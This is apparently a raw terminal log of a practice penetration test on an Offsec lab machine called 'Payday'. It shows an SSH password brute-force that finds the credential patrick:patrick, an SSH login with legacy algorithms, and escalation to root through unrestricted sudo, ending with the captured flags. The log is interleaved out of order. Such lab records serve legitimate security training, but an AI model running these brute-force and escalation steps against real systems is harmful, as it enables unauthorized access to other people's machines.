+2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: joshua (46 of 14344391 complete)
+2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: bubbles (47 of 14344391 complete)
+2026-08-25 10:58:09 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 1234567890 (48 of 14344391 complete)
+2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: superman (49 of 14344391 complete)
+2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: hannah (50 of 14344391 complete)
+2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: loveyou (51 of 14344391 complete)
+2026-08-25 10:58:12 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: amanda (52 of 14344391 complete)
+2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: pretty (53 of 14344391 complete)
+2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: basketball (54 of 14344391 complete)
+2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: andrew (55 of 14344391 complete)
+2026-08-25 10:58:13 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: angels (56 of 14344391 complete)
+2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: tweety (57 of 14344391 complete)
+2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: flower (58 of 14344391 complete)
+2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: playboy (59 of 14344391 complete)
+2026-08-25 10:58:14 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: hello (60 of 14344391 complete)
+2026-08-25 10:58:16 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: elizabeth (61 of 14344391 complete)
+2026-08-25 10:58:17 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: tinkerbell (62 of 14344391 complete)
+2026-08-25 10:58:17 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: hottie (63 of 14344391 complete)
+2026-08-25 10:58:17 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: charlie (64 of 14344391 complete)
+2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: samantha (65 of 14344391 complete)
+2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: barbie (66 of 14344391 complete)
+2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: chelsea (67 of 14344391 complete)
+2026-08-25 10:58:19 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: lovers (68 of 14344391 complete)
+2026-08-25 10:58:21 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: teamo (69 of 14344391 complete)
+2026-08-25 10:58:21 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jasmine (70 of 14344391 complete)
+2026-08-25 10:58:22 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: brandon (71 of 14344391 complete)
+2026-08-25 10:58:22 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 666666 (72 of 14344391 complete)
+2026-08-25 10:58:23 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: shadow (73 of 14344391 complete)
+2026-08-25 10:58:24 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: eminem (74 of 14344391 complete)
+2026-08-25 10:58:24 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: matthew (75 of 14344391 complete)
+2026-08-25 10:58:24 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: melissa (76 of 14344391 complete)
+2026-08-25 10:58:25 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: robert (77 of 14344391 complete)
+2026-08-25 10:58:25 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: danielle (78 of 14344391 complete)
+2026-08-25 10:58:25 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: forever (79 of 14344391 complete)
+2026-08-25 10:58:25 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: family (80 of 14344391 complete)
+2026-08-25 10:58:27 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jonathan (81 of 14344391 complete)
+2026-08-25 10:58:27 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: whatever (82 of 14344391 complete)
+2026-08-25 10:58:27 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: computer (83 of 14344391 complete)
+2026-08-25 10:58:27 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: 987654321 (84 of 14344391 complete)
+2026-08-25 10:58:29 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: dragon (85 of 14344391 complete)
+2026-08-25 10:58:29 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: cookie (86 of 14344391 complete)
+2026-08-25 10:58:29 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: vanessa (87 of 14344391 complete)
+2026-08-25 10:58:29 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: naruto (88 of 14344391 complete)
+2026-08-25 10:58:32 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: summer (89 of 14344391 complete)
+2026-08-25 10:58:32 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: spongebob (90 of 14344391 complete)
+2026-08-25 10:58:32 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: joseph (91 of 14344391 complete)
+2026-08-25 10:58:32 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: sweety (92 of 14344391 complete)
+2026-08-25 10:58:34 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: junior (93 of 14344391 complete)
+2026-08-25 10:58:34 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: yellow (94 of 14344391 complete)
+2026-08-25 10:58:34 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: softball (95 of 14344391 complete)
+2026-08-25 10:58:34 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: taylor (96 of 14344391 complete)
+2026-08-25 10:58:36 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: daniela (97 of 14344391 complete)
+2026-08-25 10:58:36 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: mickey (98 of 14344391 complete)
+2026-08-25 10:58:36 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: lauren (99 of 14344391 complete)
+2026-08-25 10:58:36 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complet
+$ [11:03:09] boxset Username patrick
+
+$ [11:03:15] boxset Password patrick
+
+$ [11:03:21] loot cred patrick patrick
+e) User: patrick (1 of 1, 0 complete) Password: princesa (100 of 14344391 complete)
+2026-08-25 10:58:37 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: alexandra (101 of 14344391 complete)
+2026-08-25 10:58:38 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: alexis (102 of 14344391 complete)
+2026-08-25 10:58:38 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: jesus (103 of 14344391 complete)
+2026-08-25 10:58:38 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: estrella (104 of 14344391 complete)
+2026-08-25 10:58:40 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: miguel (105 of 14344391 complete)
+2026-08-25 10:58:40 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: william (106 of 14344391 complete)
+2026-08-25 10:58:40 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: thomas (107 of 14344391 complete)
+2026-08-25 10:58:40 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: beautiful (108 of 14344391 complete)
+2026-08-25 10:58:40 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 0 complete) Password: patrick (109 of 14344391 complete)
+2026-08-25 10:58:40 ACCOUNT FOUND: [ssh] Host: 192.168.119.39 User: patrick Password: patrick [SUCCESS]
+2026-08-25 10:58:42 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 1 complete) Password: mylove (110 of 14344391 complete)
+2026-08-25 10:58:42 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 1 complete) Password: angela (111 of 14344391 complete)
+2026-08-25 10:58:42 ACCOUNT CHECK: [ssh] Host: 192.168.119.39 (1 of 1, 0 complete) User: patrick (1 of 1, 1 complete) Password: poohbear (112 of 14344391 complete)
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[10:58:42][39m $ [K[?1h=[?2004hboxset Username patrick[23D[32mb[32mo[32mx[32ms[32me[32mt[39m[17C[?1l>[?2004l
+[+] Username=patrick (saved to .env)
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:03:09][39m $ [K[?1h=[?2004hboxset Password patrick[23D[32mb[32mo[32mx[32ms[32me[32mt[39m[17C[?1l>[?2004l
+[+] Password=patrick (saved to .env)
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:03:15][39m $ [K[?1h=[?2004hloot cred patrick patrick[25D[32ml[32mo[32mo[32mt[39m[21C[?1l>[?2004l
+[+] Cred saved:  patrick:patrick  →  loot/creds.txt
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:03:21][39m $ [K[?1h=[?2004hssh patrick@$BoxIP[18D[32ms[32m
+$ [11:03:29] ssh patrick@$BoxIP
+
+$ [11:04:06] ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 patrick@$BoxIP
+
+$ [11:04:54] ssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 patrick@$BoxIP
+
+=== SESSION RECONNECT: 2026-08-25 11:05:56 ===
+
+$ [11:06:00] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-25 11:06:00 ===
+
+$ [11:06:03] cat >> ~/.ssh/config << 'EOF'
+
+Host 192.168.119.39
+    HostKeyAlgorithms ssh-rsa
+    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
+    MACs +hmac-md5,hmac-sha1
+EOF
+
+Script started on 2026-08-25 11:06:00+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="80" LINES="24"]
+[1m[7m%[27m[1m[0m                                                                                [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:06:00][39m $ [K[?1h=[?2004hcat >> ~/.ssh/config << 'EOF'
+[K
+Host 192.168.119.39[K
+    HostKeyAlgorithms ssh-rsa[K
+    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1[K
+    MACs +hmac-md5,hmac-sha1[K
+EOF[K
+[K[7A[49C[32mc[32ma[32mt[39m [33m>[33m>[39m[15C[33m<[33m<[39m [33m'[33mE[33mO[33mF[33m'[39m[2B[1m[31mH[1m[31mo[1m[31ms[1m[31mt[0m[39m[1B[1m[31mH[1m[31mo[1m[31ms[1m[31mt[1m[31mK[1m[31me[1m[31my[1m[31mA[1m[31ml[1m[31mg[1m[31mo[1m[31mr[1m[31mi[1m[31mt[1m[31mh[1m[31mm[1m[31ms[0m[39m[1B[17D[1m[31mK[1m[31me[1m[31mx[1m[31mA[1m[31ml[1m[31mg[1m[31mo[1m[31mr[1m[31mi[1m[31mt[1m[31mh[1m[31mm[1m[31ms[0m[39m[1B[13D[1m[31mM[1m[31mA[1m[31mC[1m[31ms[0m[39m[1B[1m[31mE[1m[31mO[1m[31mF[0m[39m[1B[K[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:06:03][39m $ [K[?1h=[?2004h
+Script done on 2026-08-25 11:06:12+01:00 [COMMAND_EXIT_CODE="0"]
+
+=== SESSION RECONNECT: 2026-08-25 11:12:09 ===
+
+$ [11:12:13] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-25 11:12:13 ===
+
+$ [11:12:19] proof linux
+
+$ [11:12:41] loot flag root 464db36410c740be502aa7e7f6a0d5eb
+s[32mh[39m[15C[?1l>[?2004l
+Unable to negotiate with 192.168.119.39 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:03:29][39m $ [K[?1h=[?2004hssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 patrick@$BoxIP[154D[32ms[32ms[32mh[39m[151C[?1l>[?2004l
+command-line line 0: Bad key types '+ssh-rsa,ssh-dss'.
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Payday[39m [33m[11:04:06][39m $ [K[?1h=[?2004hssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 patrick@$BoxIP[145D[32ms[32ms[32mh[39m[142C[?1l>[?2004l
+The authenticity of host '192.168.119.39 (192.168.119.39)' can't be established.
+RSA key fingerprint is: SHA256:4cNPcDOXrXdUvuqlTmFzow0HNSvJ1pXoNPKTZViNTYA
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.119.39' (RSA) to the list of known hosts.
+patrick@192.168.119.39's password: 
+Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+]0;patrick@payday: ~patrick@payday:~$ ls
+[0m[0mlocal.txt[0m
+[m]0;patrick@payday: ~patrick@payday:~$ cat local.txt
+b8e58a5ba1e0cf8ac614c7907f032f67
+]0;patrick@payday: ~patrick@payday:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for patrick:
+User patrick may run the following commands on this host:
+    (ALL) ALL
+]0;patrick@payday: ~patrick@payday:~$ sudo su
+]0;root@payday: /home/patrickroot@payday:/home/patrick# whoami
+root
+]0;root@payday: /home/patrickroot@payday:/home/patrick# id
+uid=0(root) gid=0(root) groups=0(root)
+]0;root@payday: /home/patrickroot@payday:/home/patrick# ls
+[0m[0mlocal.txt[0m
+[m]0;root@payday: /home/patrickroot@payday:/home/patrick# cd /root
+]0;root@payday: ~root@payday:~# ls
+[0m[0mcapture.cap[0m  [0mproof.txt[0m
+[m]0;root@payday: ~root@payday:~# cat opr   proof.txt
+464db36410c740be502aa7e7f6a0d5eb
+]0;root@payday: ~root@payday:~# ls -lh /root/capture.cap
+[0m-rw-r--r-- 1 root root 2.3K 2017-03-30 03:28 [0m/root/capture.cap[0m
+[m]0;root@payday: ~root@payday:~# proof linux
+bash: proof: command not found
+]0;root@payday: ~root@payday:~#                                                                                                                      root@payday:~# whoami && id && hostname && ifconfig && cat /root/proof.txt
+root
+uid=0(root) gid=0(root) groups=0(root)
+payday
+eth0      Link encap:Ethernet  HWaddr 00:50:56:9E:90:73  
+          inet addr:192.168.119.39  Bcast:192.168.119.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:fe9e:9073/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:71607 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:67629 error
+$ [12:34:19] cp ~/Platforms/Offsec/Payday/Payday.log ~/Documents/Obsidian/main-vault/OSCP/BOXES/BOX\ LOGS/
